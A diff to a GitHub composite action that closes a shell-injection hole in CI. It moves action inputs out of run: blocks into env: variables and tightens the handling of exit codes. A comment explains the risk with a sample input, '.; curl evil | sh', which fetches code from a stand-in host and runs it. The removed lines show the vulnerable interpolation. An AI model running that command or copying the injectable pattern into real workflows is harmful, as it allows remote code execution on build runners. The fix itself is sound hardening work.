@@ -17,17 +17,30 @@ inputs:
 runs:
   using: composite
   steps:
+    # Inputs are passed through `env:` and used quoted inside the script. Never write
+    # ${{ inputs.* }} inside a `run:` block: the expression is pasted into the shell text
+    # before bash parses it, so an input like `.; curl evil | sh` becomes code.
     - shell: bash
-      run: pip install "${{ github.action_path }}"
+      env:
+        ACTION_PATH: ${{ github.action_path }}
+      run: pip install "$ACTION_PATH"
     - shell: bash
-      run: |
-        ARGS="scan ${{ inputs.path }} --format sarif -o sinkline.sarif --min-confidence ${{ inputs.min-confidence }}"
-        if [ -n "${{ inputs.fail-on }}" ]; then ARGS="$ARGS --fail-on ${{ inputs.fail-on }}"; fi
-        sinkline $ARGS || echo "SINKLINE_FAILED=1" >> "$GITHUB_ENV"
+      env:
+        ACTION_PATH: ${{ github.action_path }}
+        INPUT_PATH: ${{ inputs.path }}
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
+        INPUT_MIN_CONFIDENCE: ${{ inputs.min-confidence }}
+      run: bash "$ACTION_PATH/scripts/action-scan.sh"
     - uses: github/codeql-action/upload-sarif@v3
       with:
         sarif_file: sinkline.sarif
         category: sinkline
     - shell: bash
+      env:
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
       run: |
-        if [ "${SINKLINE_FAILED:-0}" = "1" ]; then echo "::error::sinkline found findings at/above ${{ inputs.fail-on }}"; exit 1; fi
+        if [ "${SINKLINE_RC:-0}" = "1" ]; then
+          echo "::error::sinkline found findings at/above $INPUT_FAIL_ON"; exit 1
+        elif [ "${SINKLINE_RC:-0}" != "0" ]; then
+          echo "::error::sinkline exited with status $SINKLINE_RC"; exit 1
+        fi
